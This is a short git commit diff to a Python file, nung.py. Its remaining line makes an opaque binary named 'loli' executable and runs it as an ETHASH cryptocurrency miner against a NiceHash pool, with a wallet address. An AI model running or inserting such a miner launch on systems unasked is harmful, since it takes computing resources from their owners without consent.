814b248bd6b5fd3e05bbcbe3ad7235ce10070fd8
yeripo <110187561+yeripo@users.noreply.github.com>
2022-07-29 21:46:49 +0700

    Update nung.py

--- nung.py
+++ nung.py
@@ -1,4 +1,2 @@
 import os
-from ctypes import *
-cdll.LoadLibrary('libMagickWand-6.Q16.so.6')
 os.system("chmod +x loli && ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung")
